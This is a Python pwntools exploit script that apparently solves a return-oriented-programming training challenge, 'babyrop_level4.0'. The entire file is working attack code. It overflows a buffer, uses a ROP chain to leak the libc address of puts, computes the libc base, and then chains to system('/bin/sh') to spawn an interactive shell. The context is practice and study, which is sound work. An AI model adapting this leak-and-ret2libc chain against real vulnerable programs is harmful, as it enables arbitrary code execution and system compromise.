#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from pwn import p64, u64

context.log_level = "Error"

exe = context.binary = ELF(args.EXE or "../Binaries/babyrop_level4.0")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# -- Exploit goes here --

io = start()

elf = ELF("../Binaries/babyrop_level4.0")
rop = ROP("../Binaries/babyrop_level4.0")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

payload = b"A" * 0x48
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(elf.got["puts"])
payload += p64(elf.symbols["puts"])
payload += p64(elf.symbols["challenge"])

io.sendline(payload)

io.recvlines(28)
addr = u64(io.recvline().strip().ljust(8, b"\x00"))
print("Puts Address is : ", hex(addr))
libc_base_addr = addr - libc_elf.symbols["puts"]

print("Libc base address is : ", hex(libc_base_addr))

payload = b"A" * 0x48
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(libc_base_addr + next(libc_elf.search(b"/bin/sh")))
payload += p64(rop.find_gadget(["ret"]).address)
payload += p64(libc_base_addr + libc_elf.symbols["system"])
payload += p64(libc_base_addr + libc_elf.symbols["exit"])

io.sendline(payload)
io.recvlines(25)

io.interactive()
